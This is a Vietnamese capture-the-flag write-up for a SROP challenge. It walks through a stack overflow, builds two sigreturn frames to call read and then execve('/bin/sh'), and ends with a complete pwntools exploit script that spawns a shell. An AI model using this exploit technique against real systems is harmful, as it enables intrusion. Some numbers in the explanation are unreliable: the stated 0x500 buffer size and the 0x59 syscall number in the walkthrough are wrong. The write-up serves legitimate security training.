# Video anh Trí
[SROP](https://youtu.be/2PxQaj0-a2M)

# Phân tích challenge

<img width="554" height="148" alt="image" src="https://github.com/user-attachments/assets/5db8648f-23f0-4de1-91fc-a40447e99759" />
<img width="598" height="184" alt="image" src="https://github.com/user-attachments/assets/311af485-782d-44a9-8dc5-09fcb100932a" />

### Lỗ hổng:

Chương trình có lỗi *buffer overflow* cho phép nhập 1208 (0x500) BYTES. 

### Cơ chế bảo vệ:

*No Canary* cho phép ghi đè dữ liệu tự do trong Stack không bị kiểm duyệt

*No PIE* tức địa chỉ binary tĩnh

### Gadget

<img width="814" height="118" alt="image" src="https://github.com/user-attachments/assets/35a80b37-1b76-4b98-806d-46d85b0b82fc" />
<img width="869" height="78" alt="image" src="https://github.com/user-attachments/assets/e2a189f8-0698-4987-ad07-f82369c3a809" />

Trong các gadget chỉ có `pop rax` và `syscall` chứ không có các gadget điều khiển thanh ghi chứa tham số (rdi,rsi,rdx...).

Để gọi được `execve` với tham số là `/bin/sh` thì cần cách khác để điều khiển các thanh ghi.

<img width="1016" height="202" alt="image" src="https://github.com/user-attachments/assets/65f08509-fea5-42bc-959b-804a150edd7e" />

`rt_sigreturn` là lệnh syscall sẽ lấy dữ liệu trên Stack để ghi đè vào các thanh ghi. 

Điều khiển cấu trúc thanh ghi để gọi lệnh read:

    rw_section=0x404320 
    pop_rax_syscall=0x0000000000401156
    syscall=0x0000000000401157
    
    frame=SigreturnFrame()    //frame nạp cấu trúc thanh ghi trên Stack
    frame.rax=0
    frame.rdi=0
    frame.rsi=rw_section
    frame.rdx=0x400
    frame.rsp=rw_section      //stack pivot nhảy đến vùng rw
    frame.rip=syscall
    
    payload=b'A'*0x18
    payload+=flat(
    	pop_rax_syscall,
    	0x0f,
    	bytes(frame)
    	)
    
    p.send(payload)

Cần 1 nơi để chứa `/bin/sh` nên cần gọi read trước rồi thiết lập execve.

<img width="890" height="562" alt="image" src="https://github.com/user-attachments/assets/79cf323c-fc9d-42e0-89bd-d408be8c540a" />

Các thanh ghi đã được thiết lập đúng như frame chúng ta nhập vào, đã đủ gọi read để nhập payload tiếp theo.

    frame=SigreturnFrame()
    frame.rax=0x59            //mã gọi execve
    frame.rdi=rw_section      //chưa biết địa chỉ /bin/sh ở đâu
    frame.rsi=0
    frame.rdx=0
    frame.rsp=rw_section
    frame.rip=syscall
    
    payload=flat(
    	pop_rax_syscall,
    	0x0f,
    	bytes(frame),
    	b'/bin/sh'
    	)
    
    input()
    p.send(payload)

<img width="754" height="410" alt="image" src="https://github.com/user-attachments/assets/6dcdc984-ae4a-4dd7-aa38-1aa63a898e5f" />

Chạy thử để tìm xem `/bin/sh` nằm ở đâu trong Stack.

Thế vào frame.rdi:

    frame.rdi=0x404428

<img width="1086" height="546" alt="image" src="https://github.com/user-attachments/assets/71162c9e-76a9-441b-b1cb-0868f4350fcc" />

# Script Python

    #!/usr/bin/env python3
    from pwn import *
    context.binary=exe=ELF('./sigrop',checksec=False)
    p=process(exe.path)
    
    def GDB():
    	if not args.REMOTE:
    		gdb.attach(p,gdbscript='''
    			b*main+65
    			c
    			'''
    		)
    		input()
    
    GDB()
    
    rw_section=0x404320
    pop_rax_syscall=0x0000000000401156
    syscall=0x0000000000401157
    
    frame=SigreturnFrame()
    frame.rax=0
    frame.rdi=0
    frame.rsi=rw_section
    frame.rdx=0x400
    frame.rsp=rw_section
    frame.rip=syscall
    
    payload=b'A'*0x18
    payload+=flat(
    	pop_rax_syscall,
    	0x0f,
    	bytes(frame)
    	)
    
    p.send(payload)
    
    frame=SigreturnFrame()
    frame.rax=0x3b
    frame.rdi=0x404428
    frame.rsi=0
    frame.rdx=0
    frame.rsp=rw_section
    frame.rip=syscall
    
    payload=flat(
    	pop_rax_syscall,
    	0x0f,
    	bytes(frame),
    	b'/bin/sh'
    	)
    
    input()
    p.send(payload)
    
    p.interactive()
